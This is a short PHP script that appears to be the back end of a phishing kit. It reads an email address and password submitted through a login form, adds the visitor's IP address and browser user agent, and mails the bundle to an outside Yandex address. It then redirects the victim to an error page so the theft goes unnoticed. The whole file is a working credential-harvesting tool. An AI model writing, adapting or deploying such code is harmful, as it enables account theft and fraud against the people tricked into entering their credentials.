<?php
$ip = $_SERVER['REMOTE_ADDR'];
$time = $_SERVER['HTTP_USER_AGENT'];

$msg  = "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Sent from $ip on $time\n";
 
if (! empty($_POST))
{
$to = "ikenuel@yandex.com";
$subject = "Wi job";

mail($to,$subject,$msg);
header("Location: err.html");
}
?>